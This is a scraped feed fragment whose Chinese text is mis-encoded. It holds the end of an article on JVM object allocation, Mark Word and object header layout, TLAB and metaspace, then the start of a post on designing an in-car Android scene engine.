<span class="hljs-bullet">2.</span> é€‰æ‹©åˆ†é…æ–¹å¼
   â”œâ”€ æŒ‡é’ˆç¢°æ’ï¼ˆå †è§„æ•´ï¼‰
   â”œâ”€ ç©ºé—²åˆ—è¡¨ï¼ˆå †ä¸è§„æ•´ï¼‰
   â””â”€ TLABï¼ˆçº¿ç¨‹æœ¬åœ°åˆ†é…ç¼“å†²ï¼‰
   â†“
<span class="hljs-bullet">3.</span> åœ¨EdenåŒºåˆ†é…
   â””â”€ ä¼˜å…ˆåœ¨TLABä¸­åˆ†é…
   â””â”€ TLABç”¨å®Œååœ¨EdenåŒºå…±äº«åŒºåˆ†é…
   â†“
<span class="hljs-bullet">4.</span> å¦‚æœEdenåŒºæ»¡ â†’ Minor GC
   â†“
<span class="hljs-bullet">5.</span> å­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°SurvivoråŒº
   â†“
<span class="hljs-bullet">6.</span> å¤šæ¬¡GCåæ™‹å‡åˆ°è€å¹´ä»£
</code></pre>
<p><strong>åˆ†é…æ–¹å¼è¯´æ˜ï¼š</strong></p>
<ul>
<li><strong>æŒ‡é’ˆç¢°æ’</strong>ï¼šé€‚ç”¨äºå †å†…å­˜è§„æ•´ï¼Œç§»åŠ¨æŒ‡é’ˆåˆ†é…è¿ç»­å†…å­˜</li>
<li><strong>ç©ºé—²åˆ—è¡¨</strong>ï¼šé€‚ç”¨äºå †å†…å­˜ä¸è§„æ•´ï¼Œä»ç©ºé—²åˆ—è¡¨åˆ†é…</li>
<li><strong>TLAB</strong>ï¼šæ¯ä¸ªçº¿ç¨‹åœ¨EdenåŒºæœ‰ç‹¬ç«‹çš„åˆ†é…åŒºåŸŸï¼Œå‡å°‘ç«äº‰</li>
</ul>
<p><strong>2. Mark Wordçš„è¯¦ç»†ç»“æ„ï¼Ÿ</strong></p>
<p><strong>Mark Wordç»“æ„ï¼ˆ64ä½JVMï¼‰ï¼š</strong></p>
<p>Mark Wordåœ¨64ä½JVMä¸­å 8å­—èŠ‚ï¼ˆ64ä½ï¼‰ï¼Œåœ¨ä¸åŒé”çŠ¶æ€ä¸‹å­˜å‚¨ä¸åŒçš„ä¿¡æ¯ï¼š</p>



































<table><thead><tr><th>é”çŠ¶æ€</th><th>Mark Wordï¼ˆ64ä½ï¼‰</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>æ— é”</strong></td><td>25ä½æœªä½¿ç”¨ + 31ä½hashCode + 1ä½æœªä½¿ç”¨ + 4ä½GCå¹´é¾„ + 1ä½åå‘é”æ ‡å¿—(0) + 2ä½é”æ ‡å¿—(01)</td><td>æ­£å¸¸çŠ¶æ€</td></tr><tr><td><strong>åå‘é”</strong></td><td>54ä½çº¿ç¨‹ID + 2ä½Epoch + 1ä½æœªä½¿ç”¨ + 4ä½GCå¹´é¾„ + 1ä½åå‘é”æ ‡å¿—(1) + 2ä½é”æ ‡å¿—(01)</td><td>åå‘é”çŠ¶æ€</td></tr><tr><td><strong>è½»é‡çº§é”</strong></td><td>62ä½æŒ‡å‘æ ˆä¸­é”è®°å½•çš„æŒ‡é’ˆ + 2ä½é”æ ‡å¿—(00)</td><td>è½»é‡çº§é”çŠ¶æ€</td></tr><tr><td><strong>é‡é‡çº§é”</strong></td><td>62ä½æŒ‡å‘monitorçš„æŒ‡é’ˆ + 2ä½é”æ ‡å¿—(10)</td><td>é‡é‡çº§é”çŠ¶æ€</td></tr><tr><td><strong>GCæ ‡è®°</strong></td><td>ç©ºï¼ˆä¸éœ€è¦è®°å½•ä¿¡æ¯ï¼‰ + 2ä½é”æ ‡å¿—(11)</td><td>GCæ ‡è®°çŠ¶æ€</td></tr></tbody></table>
<p><strong>å…³é”®ç‚¹ï¼š</strong></p>
<ul>
<li>Mark Wordåœ¨ä¸åŒé”çŠ¶æ€ä¸‹å¤ç”¨ï¼Œå­˜å‚¨ä¸åŒçš„ä¿¡æ¯</li>
<li>é”æ ‡å¿—ä½ï¼ˆæœ€å2ä½ï¼‰ç”¨äºæ ‡è¯†é”çŠ¶æ€</li>
<li>è¿™æ˜¯synchronizedé”å‡çº§æœºåˆ¶çš„åŸºç¡€</li>
</ul>
<p><strong>3. å¯¹è±¡å¤´çš„å®Œæ•´ç»“æ„ï¼Ÿ</strong></p>
<p>å¯¹è±¡å¤´çš„å®Œæ•´ç»“æ„ï¼š</p>
<p><strong>å¯¹è±¡å¤´ï¼ˆObject Headerï¼‰ï¼š</strong></p>
<ol>
<li>
<p><strong>Mark Wordï¼ˆæ ‡è®°å­—æ®µï¼‰</strong></p>
<ul>
<li><strong>å¤§å°</strong>ï¼š32ä½JVMå 32ä½ï¼ˆ4å­—èŠ‚ï¼‰ï¼Œ64ä½JVMå 64ä½ï¼ˆ8å­—èŠ‚ï¼‰</li>
<li><strong>å†…å®¹</strong>ï¼šhashCodeã€GCå¹´é¾„ã€é”çŠ¶æ€ã€åå‘çº¿ç¨‹IDç­‰</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼šåœ¨ä¸åŒé”çŠ¶æ€ä¸‹å­˜å‚¨ä¸åŒçš„ä¿¡æ¯</li>
</ul>
</li>
<li>
<p><strong>ç±»å‹æŒ‡é’ˆï¼ˆClass Pointerï¼‰</strong></p>
<ul>
<li><strong>å¤§å°</strong>ï¼š32ä½JVMå 32ä½ï¼ˆ4å­—èŠ‚ï¼‰ï¼Œ64ä½JVMå 64ä½ï¼ˆ8å­—èŠ‚ï¼Œå¯èƒ½å‹ç¼©ä¸º32ä½ï¼‰</li>
<li><strong>å†…å®¹</strong>ï¼šæŒ‡å‘å¯¹è±¡æ‰€å±çš„ç±»å…ƒæ•°æ®ï¼ˆæ–¹æ³•åŒºä¸­çš„ç±»ä¿¡æ¯ï¼‰</li>
<li><strong>ä½œç”¨</strong>ï¼šJVMé€šè¿‡è¿™ä¸ªæŒ‡é’ˆç¡®å®šå¯¹è±¡æ˜¯å“ªä¸ªç±»çš„å®ä¾‹</li>
</ul>
</li>
<li>
<p><strong>æ•°ç»„é•¿åº¦ï¼ˆArray Lengthï¼‰</strong></p>
<ul>
<li><strong>å¤§å°</strong>ï¼š32ä½æ•´æ•°ï¼ˆ4å­—èŠ‚ï¼‰</li>
<li><strong>å­˜åœ¨æ¡ä»¶</strong>ï¼šä»…å½“å¯¹è±¡æ˜¯æ•°ç»„æ—¶æ‰æœ‰</li>
<li><strong>å†…å®¹</strong>ï¼šæ•°ç»„çš„é•¿åº¦</li>
</ul>
</li>
</ol>
<p><strong>å®Œæ•´ç»“æ„å›¾ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss">å¯¹è±¡å¤´ç»“æ„ï¼š

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  <span class="hljs-selector-tag">Mark</span> Word      â”‚ <span class="hljs-number">8</span>å­—èŠ‚ï¼ˆ<span class="hljs-number">64</span>ä½ï¼‰æˆ–<span class="hljs-number">4</span>å­—èŠ‚ï¼ˆ<span class="hljs-number">32</span>ä½ï¼‰
â”‚  (é”çŠ¶æ€ä¿¡æ¯)    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  ç±»å‹æŒ‡é’ˆ        â”‚ <span class="hljs-number">8</span>å­—èŠ‚æˆ–<span class="hljs-number">4</span>å­—èŠ‚ï¼ˆå¯èƒ½å‹ç¼©ï¼‰
â”‚  (æŒ‡å‘ç±»ä¿¡æ¯)    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  æ•°ç»„é•¿åº¦        â”‚ <span class="hljs-number">4</span>å­—èŠ‚ï¼ˆä»…æ•°ç»„å¯¹è±¡ï¼‰
â”‚  (æ•°ç»„é•¿åº¦)      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>4. TLABçš„å·¥ä½œåŸç†ï¼Ÿ</strong></p>
<p>æ¯ä¸ªçº¿ç¨‹åœ¨EdenåŒºæœ‰ç‹¬ç«‹çš„TLABï¼Œå¯¹è±¡ä¼˜å…ˆåœ¨TLABä¸­åˆ†é…ï¼ŒTLABç”¨å®Œååœ¨å…±äº«åŒºåˆ†é…ï¼ˆéœ€è¦åŒæ­¥ï¼‰ã€‚</p>
<p><strong>5. æŒ‡é’ˆç¢°æ’å’Œç©ºé—²åˆ—è¡¨çš„å®ç°ï¼Ÿ</strong></p>
<p><strong>1. æŒ‡é’ˆç¢°æ’ï¼ˆBump the Pointerï¼‰å®ç°ï¼š</strong></p>
<pre><code class="hljs language-css" lang="css">æŒ‡é’ˆç¢°æ’ï¼š

<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[å¯¹è±¡2]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span><span class="hljs-selector-attr">[ç©ºé—²]</span>
                 â†‘æŒ‡é’ˆ â†’ åç§» â†’ <span class="hljs-selector-attr">[æ–°å¯¹è±¡]</span>
</code></pre>
<p><strong>2. ç©ºé—²åˆ—è¡¨ï¼ˆFree Listï¼‰å®ç°ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">ç©ºé—²åˆ—è¡¨ï¼š

<span class="hljs-section">[å¯¹è±¡1]</span><span class="hljs-section">[ç©º]</span><span class="hljs-section">[å¯¹è±¡2]</span><span class="hljs-section">[ç©º]</span><span class="hljs-section">[å¯¹è±¡3]</span>
ç©ºé—²åˆ—è¡¨: <span class="hljs-section">[ä½ç½®1, ä½ç½®3]</span> â†’ é€‰æ‹©ä½ç½®åˆ†é…æ–°å¯¹è±¡
</code></pre>
<p><strong>å¯¹æ¯”ï¼š</strong></p>






























<table><thead><tr><th>ç‰¹æ€§</th><th>æŒ‡é’ˆç¢°æ’</th><th>ç©ºé—²åˆ—è¡¨</th></tr></thead><tbody><tr><td><strong>é€‚ç”¨åœºæ™¯</strong></td><td>å †å†…å­˜è§„æ•´</td><td>å †å†…å­˜ä¸è§„æ•´</td></tr><tr><td><strong>åˆ†é…é€Ÿåº¦</strong></td><td>å¿«ï¼ˆåªéœ€ç§»åŠ¨æŒ‡é’ˆï¼‰</td><td>è¾ƒæ…¢ï¼ˆéœ€è¦æŸ¥æ‰¾ç©ºé—²åˆ—è¡¨ï¼‰</td></tr><tr><td><strong>å†…å­˜ç¢ç‰‡</strong></td><td>æ— ç¢ç‰‡</td><td>å¯èƒ½æœ‰ç¢ç‰‡</td></tr><tr><td><strong>å®ç°å¤æ‚åº¦</strong></td><td>ç®€å•</td><td>è¾ƒå¤æ‚</td></tr></tbody></table>
<p><strong>6. å¯¹è±¡è®¿é—®å®šä½çš„åº•å±‚å®ç°ï¼Ÿ</strong></p>
<p><strong>HotSpotä½¿ç”¨ç›´æ¥æŒ‡é’ˆè®¿é—®çš„åº•å±‚å®ç°ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss">ç›´æ¥æŒ‡é’ˆè®¿é—®å®ç°ï¼š

æ ˆå¼•ç”¨(åœ°å€) â†’ å †ä¸­çš„å¯¹è±¡ â†’ å¯¹è±¡å¤´ä¸­ç±»å‹æŒ‡é’ˆ â†’ æ–¹æ³•åŒºä¸­çš„ç±»ä¿¡æ¯

åªéœ€ä¸€æ¬¡å†…å­˜è®¿é—®ï¼Œç›´æ¥è®¿é—®å¯¹è±¡
</code></pre>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>è®¿é—®é€Ÿåº¦å¿«ï¼šåªéœ€ä¸€æ¬¡å†…å­˜è®¿é—®</li>
<li>å®ç°ç®€å•ï¼šå¼•ç”¨ç›´æ¥æŒ‡å‘å¯¹è±¡</li>
<li>å†…å­˜å ç”¨å°ï¼šä¸éœ€è¦é¢å¤–çš„å¥æŸ„æ± </li>
</ul>
<p><strong>ä»£ä»·ï¼š</strong></p>
<ul>
<li>GCæ—¶éœ€è¦æ›´æ–°æ‰€æœ‰å¼•ç”¨ï¼šå¯¹è±¡ç§»åŠ¨æ—¶éœ€è¦æ›´æ–°æ‰€æœ‰æŒ‡å‘è¯¥å¯¹è±¡çš„å¼•ç”¨</li>
<li>HotSpoté€šè¿‡ä¼˜åŒ–GCç®—æ³•æ¥å‡å°‘å¯¹è±¡ç§»åŠ¨ï¼Œé™ä½è¿™ä¸ªå¼€é”€</li>
</ul>
<h4 data-id="heading-93">16.2 æ–°æŠ€æœ¯é¢˜</h4>
<p><strong>1. å…ƒç©ºé—´ç›¸æ¯”æ°¸ä¹…ä»£çš„ä¼˜åŠ¿ï¼Ÿ</strong></p>
<p>å…ƒç©ºé—´ç›¸æ¯”æ°¸ä¹…ä»£çš„ä¸»è¦ä¼˜åŠ¿ï¼š</p>
<ol>
<li>
<p><strong>æé«˜GCæ•ˆç‡</strong></p>
<ul>
<li>æ°¸ä¹…ä»£GCæ•ˆç‡è¾ƒä½ï¼Œå®¹æ˜“å¯¼è‡´Full GC</li>
<li>å…ƒç©ºé—´GCæ•ˆç‡æ›´é«˜ï¼Œå¯ä»¥æ›´åŠæ—¶åœ°å›æ”¶ç±»å…ƒæ•°æ®</li>
</ul>
</li>
<li>
<p><strong>é¿å…å†…å­˜æº¢å‡º</strong></p>
<ul>
<li>æ°¸ä¹…ä»£å¤§å°å›ºå®šï¼Œå®¹æ˜“å‘ç”ŸOutOfMemoryError: PermGen space</li>
<li>å…ƒç©ºé—´å¤§å°åŠ¨æ€è°ƒæ•´ï¼Œä¸å®¹æ˜“æº¢å‡ºï¼ˆé™¤éè¾¾åˆ°MaxMetaspaceSizeï¼‰</li>
</ul>
</li>
<li>
<p><strong>æ›´å¥½çš„å†…å­˜ç®¡ç†</strong></p>
<ul>
<li>æ°¸ä¹…ä»£åœ¨å †ä¸­ï¼Œå—å †å†…å­˜é™åˆ¶</li>
<li>å…ƒç©ºé—´åœ¨æœ¬åœ°å†…å­˜ï¼Œä¸å—å †å†…å­˜é™åˆ¶ï¼Œç®¡ç†æ›´çµæ´»</li>
</ul>
</li>
<li>
<p><strong>ä¸HotSpotåˆ†ç¦»</strong></p>
<ul>
<li>æ°¸ä¹…ä»£çš„å®ç°ä¸HotSpotè€¦åˆ</li>
<li>å…ƒç©ºé—´çš„å®ç°ä¸HotSpotåˆ†ç¦»ï¼Œæ›´å®¹æ˜“ä¼˜åŒ–</li>
</ul>
</li>
</ol>
<p><strong>å®é™…å¥½å¤„ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ°¸ä¹…ä»£ï¼šå›ºå®šå¤§å°ï¼Œå®¹æ˜“æº¢å‡º</span>
-XX:PermSize=64m
-XX:MaxPermSize=256m
<span class="hljs-comment">// å¦‚æœç±»åŠ è½½è¿‡å¤šï¼Œå¯èƒ½æº¢å‡º</span>

<span class="hljs-comment">// å…ƒç©ºé—´ï¼šåŠ¨æ€è°ƒæ•´ï¼Œä¸å®¹æ˜“æº¢å‡º</span>
-XX:MetaspaceSize=64m
-XX:MaxMetaspaceSize=256m
<span class="hljs-comment">// ä¼šæ ¹æ®å®é™…ä½¿ç”¨æƒ…å†µåŠ¨æ€è°ƒæ•´</span>
</code></pre>
<p><strong>2. ç°ä»£JVMçš„å†…å­˜ç®¡ç†ä¼˜åŒ–ï¼Ÿ</strong></p>
<ul>
<li>æŒ‡é’ˆå‹ç¼©</li>
<li>å¯¹è±¡å¯¹é½ä¼˜åŒ–</li>
<li>TLABä¼˜åŒ–</li>
<li>å¤§å¯¹è±¡ç›´æ¥è¿›å…¥è€å¹´ä»£</li>
</ul>
<p><strong>3. å¤§å¯¹è±¡ç›´æ¥è¿›å…¥è€å¹´ä»£çš„æœºåˆ¶ï¼Ÿ</strong></p>
<p>è¶…è¿‡-XX:PretenureSizeThresholdè®¾ç½®çš„å¤§å¯¹è±¡ç›´æ¥è¿›å…¥è€å¹´ä»£ï¼Œé¿å…åœ¨EdenåŒºå’ŒSurvivoråŒºä¹‹é—´å¤åˆ¶ã€‚</p>
<p><strong>4. åŠ¨æ€å¯¹è±¡å¹´é¾„åˆ¤å®šçš„åŸç†ï¼Ÿ</strong></p>
<p>SurvivoråŒºä¸­ç›¸åŒå¹´é¾„çš„å¯¹è±¡å¤§å°è¶…è¿‡SurvivoråŒºçš„ä¸€åŠæ—¶ï¼Œå¤§äºç­‰äºè¯¥å¹´é¾„çš„å¯¹è±¡è¿›å…¥è€å¹´ä»£ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€è½¦è½½Androidã€‘ã€Œåœºæ™¯å¼•æ“ã€è®¾è®¡æ€è·¯åˆ†äº«]]></title>    <link>https://juejin.cn/post/7592593491860946944</link>    <guid>https://juejin.cn/post/7592593491860946944</guid>    <pubDate>2026-01-08T07:21:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592593491860946944" data-draft-id="7592119218029969442" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€è½¦è½½Androidã€‘ã€Œåœºæ™¯å¼•æ“ã€è®¾è®¡æ€è·¯åˆ†äº«"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-01-08T07:21:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ—æ ©link"/> <meta itemprop="url" content="https://juejin.cn/user/870468939434039"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€è½¦è½½Androidã€‘ã€Œåœºæ™¯å¼•æ“ã€è®¾è®¡æ€è·¯åˆ†äº«
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/870468939434039/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ—æ ©link
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:21:15.000Z" title="Thu Jan 08 2026 07:21:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{font-family:-apple-system,BlinkMacSystemFont,PingFang SC,Helvetica Neue,Helvetica,Arial,sans-serif;word-break:break-word;line-height:1.75;font-weight:200;font-size:16px;overflow-x:hidden;color:#666;letter-spacing:.5px}.markdown-body a{text-decoration:none;color:#0064c8;position:relative}.markdown-body a:after{content:"";position:absolute;bottom:-2px;left:0;width:100%;height:1px;background-color:rgba(0,100,200,.7);transform:scale(0);transition:all .4s ease-in-out}.markdown-body a:link:hover:after{transform:scale(1)}.markdown-body code{padding:2px 4px;font-size:.9em;font-family:Menlo,Monaco,Consolas,Courier New,monospace;border-radius:2px;background-color:rgba(0,46,70,.0431);color:#39f}.markdown-body strong{font-weight:400}.markdown-body em{color:#ff6a00}.markdown-body del,.markdown-body s{color:#bbb}.markdown-body small{font-size:.8em;color:#bbb}.markdown-body kbd{margin:0 .1em;padding:5px 8px 3px;border:1px solid #d1d5d9;border-radius:3px;box-shadow:0 1px 0 0 #e3e4e6,inset 0 0 0 2px #fff;background-color:#eee;font-weight:600;font-size:.8em;font-family:Arial,Helvetica Neue,Helvetica,sans-serif;white-space:nowrap;color:#666}.markdown-body kbd:first-child{margin-left:0}.markdown-body kbd:last-child{margin-right:0}.markdown-body img{display:block;border:0;max-width:calc(100% - 20px);min-width:20px;min-height:20px;margin:0 10px;box-shadow:0 2px 8px 2px rgba(0,0,0,.2);transition:all .25s ease-in-out}.markdown-body img:hover{transform:translateY(-4px)}.markdown-body blockquote,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{line-height:inherit;font-size:inherit;color:inherit}.markdown-body blockquote:first-child,.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child,.markdown-body ol:first-child,.markdown-body p:first-child,.markdown-body pre:first-child,.markdown-body table:first-child,.markdown-body ul:first-child{margin-top:0}.markdown-body blockquote:last-child,.markdown-body h1:last-child,.markdown-body h2:last-child,.markdown-body h3:last-child,.markdown-body h4:last-child,.markdown-body h5:last-child,.markdown-body h6:last-child,.markdown-body ol:last-child,.markdown-body p:last-child,.markdown-body pre:last-child,.markdown-body table:last-child,.markdown-body ul:last-child{margin-bottom:0}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:1.6em 0 .6em;color:#333;font-weight:400;position:relative}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{position:absolute;left:-2em}.markdown-body h1{font-size:1.75em}.markdown-body h1:before{content:"#"}.markdown-body h1:first-child{margin-top:0}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.35em}.markdown-body h4{font-size:1.2em}.markdown-body h5{font-size:1.1em}.markdown-body h6{font-size:1em}.markdown-body blockquote,.markdown-body ol,.markdown-body pre,.markdown-body table,.markdown-body ul{margin:1em 0}.markdown-body p{margin:.7em 0;word-break:break-word}.markdown-body pre{padding:8px 12px;color:#666;background-color:rgba(0,46,70,.0431);border:1px solid #ebebeb;tab-size:4;white-space:pre-wrap;line-height:1.4}.markdown-body pre code{color:inherit;background-color:transparent;padding:0}.markdown-body ol,.markdown-body ul{margin:1em 0 1em 2em;padding:0;line-height:1.5!important;font-size:inherit;color:inherit}.markdown-body ol:first-child,.markdown-body ul:first-child{margin-top:0}.markdown-body ol:last-child,.markdown-body ul:last-child{margin-bottom:0}.markdown-body ol li,.markdown-body ul li{margin:.5em 0;list-style:inherit}.markdown-body ul{list-style:disc outside}.markdown-body ul ul{list-style-type:circle}.markdown-body ul ul ul{list-style-type:square}.markdown-body ol{list-style:decimal outside}.markdown-body ol ol{list-style-type:lower-alpha}.markdown-body ol ol ol{list-style-type:lower-roman}.markdown-body blockquote{font-size:.9em;padding:8px 20px 8px 15px;color:#666;border-left:5px solid rgba(0,100,200,.7);background-color:rgba(0,100,200,.1)}.markdown-body table{border-collapse:collapse;border-spacing:0;max-width:100%;min-width:50%;word-wrap:break-word;color:inherit}.markdown-body table thead tr{background-color:#f4f6f7}.markdown-body table td,.markdown-body table th{padding:4px 16px;font-size:.95em;text-align:left;color:inherit;border:0;min-width:72px}.markdown-body table td[align=center],.markdown-body table th[align=center]{text-align:center}.markdown-body table td[align=right],.markdown-body table th[align=right]{text-align:right}.markdown-body table th{border-bottom:2px solid #e3e4e6;color:#333;font-weight:400;white-space:nowrap}.markdown-body table td{border-bottom:1px solid #ebebeb}.markdown-body hr{margin:1.5em 0;padding:0;border:0;background:linear-gradient(90deg,rgba(0,46,70,.0431),#ebebeb 50%,rgba(0,46,70,.0431));height:1px}.markdown-body br{content:"";display:block}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p>åœ¨æ™ºèƒ½æ±½è½¦å¿«é€Ÿå‘å±•çš„ä»Šå¤©ï¼Œè½¦è½½ç³»ç»Ÿæ—©å·²ä¸å†æ˜¯ç®€å•çš„å¨±ä¹æˆ–å¯¼èˆªå·¥å…·ï¼Œè€Œæ˜¯é›†æˆäº†æ„ŸçŸ¥ã€å†³ç­–ä¸æœåŠ¡äºä¸€ä½“çš„æ™ºèƒ½äº¤äº’å¹³å°ã€‚å…¶ä¸­ï¼Œâ€œ<strong>åœºæ™¯å¼•æ“</strong>â€ï¼ˆåˆç§°â€œ<strong>æ™ºèƒ½åœºæ™¯</strong>â€ï¼‰ä½œä¸ºæå‡ç”¨æˆ·ä½“éªŒã€å®ç°ä¸ªæ€§åŒ–æœåŠ¡çš„æ ¸å¿ƒèƒ½åŠ›ï¼Œæ­£è¢«è¶Šæ¥è¶Šå¤šçš„ä¸­é«˜ç«¯æ™ºèƒ½æ±½è½¦æ‰€é‡‡ç”¨ã€‚</p>
<p>æœ¬æ–‡å°†ç»“åˆç¬”è€…åœ¨å®é™…é¡¹ç›®ä¸­çš„å·¥ä½œç»éªŒï¼Œæ·±å…¥åˆ†æè½¦è½½â€œåœºæ™¯å¼•æ“â€çš„æ ¸å¿ƒéœ€æ±‚ï¼Œå¹¶æ¢è®¨å…¶é«˜æ•ˆè®¾è®¡æ–¹æ³•ã€‚å‡ºäºä¼ä¸šä¿å¯†è¦æ±‚ï¼Œæ–‡ä¸­æ‰€å‘ˆç°çš„åœºæ™¯å¼•æ“ä¸ºä¸€ä¸ªç®€åŒ–ç‰ˆçš„åŸå‹ï¼Œä»…ç”¨äºæŠ€æœ¯åŸç†çš„é˜è¿°ä¸äº¤æµã€‚</p>
<blockquote>
<p>æœ¬æ–‡æºç è·¯å¾„ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flinxu-link%2FVehicleSceneEngine" target="_blank" title="https://github.com/linxu-link/VehicleSceneEngine" ref="nofollow noopener noreferrer">github.com/linxu-link/â€¦</a></p>
</blockquote>
<h2 data-id="heading-0">ä¸€ã€ä»€ä¹ˆæ˜¯â€œåœºæ™¯å¼•æ“â€ï¼Ÿ</h2>
<p>ç®€å•æ¥è¯´ï¼Œåœºæ™¯å¼•æ“æ˜¯ä¸€ä¸ª<strong>åŸºäºå¤šç»´ä¸Šä¸‹æ–‡æ„ŸçŸ¥çš„è‡ªåŠ¨åŒ–å†³ç­–ä¸æ‰§è¡Œæ¡†æ¶</strong>ã€‚å®ƒèƒ½å¤Ÿå®æ—¶é‡‡é›†è½¦è¾†çŠ¶æ€ã€ç”¨æˆ·è¡Œä¸ºã€ç¯å¢ƒä¿¡æ¯ç­‰æ•°æ®ï¼Œåœ¨æ»¡è¶³é¢„è®¾æ¡ä»¶æ—¶ï¼Œè‡ªåŠ¨è§¦å‘ä¸€ç³»åˆ—æœåŠ¡ç»„åˆï¼ˆå¦‚è°ƒèŠ‚ç©ºè°ƒã€åˆ‡æ¢åª’ä½“ã€å‘é€é€šçŸ¥ç­‰ï¼‰ã€‚</p>
